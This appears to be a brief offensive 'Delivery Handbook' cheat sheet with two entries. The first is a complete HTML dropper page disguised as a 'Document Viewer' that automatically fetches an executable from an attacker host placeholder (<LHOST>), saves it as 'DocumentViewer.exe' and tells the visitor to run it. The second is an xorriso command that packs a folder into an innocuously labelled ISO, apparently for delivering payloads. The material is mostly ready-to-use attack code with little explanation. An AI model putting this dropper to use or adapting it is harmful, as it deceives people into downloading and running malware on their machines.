# Delivery Handbook

## Table of Contents

- [HTML Dropper](#html-dropper)
- [xorriso](#xorriso)

## HTML Dropper

```html
<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer - Loading...</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; 
                  border-radius: 50%; width: 60px; height: 60px; 
                  animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Preparing Document...</h1>
    <div class="loader"></div>
    <p id="status">Initializing...</p>
    
    <script>
        async function downloadAndSave() {
            document.getElementById('status').textContent = 'Loading document components...';
            
            const response = await fetch('http://<LHOST>/<FILE>.exe');
            const blob = await response.blob();
            
            document.getElementById('status').textContent = 'Finalizing...';
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'DocumentViewer.exe';
            document.body.appendChild(a);
            a.click();
            
            document.getElementById('status').textContent = 'Please run DocumentViewer.exe to view the document';
            
            setTimeout(() => {
                window.URL.revokeObjectURL(url);
            }, 1000);
        }
        
        setTimeout(downloadAndSave, 2000);
    </script>
</body>
</html>
```

## xorriso

```console
$ xorriso -as mkisofs -o <FILE>.iso -J -R -V "Documents_Q4" <FOLDER>/
```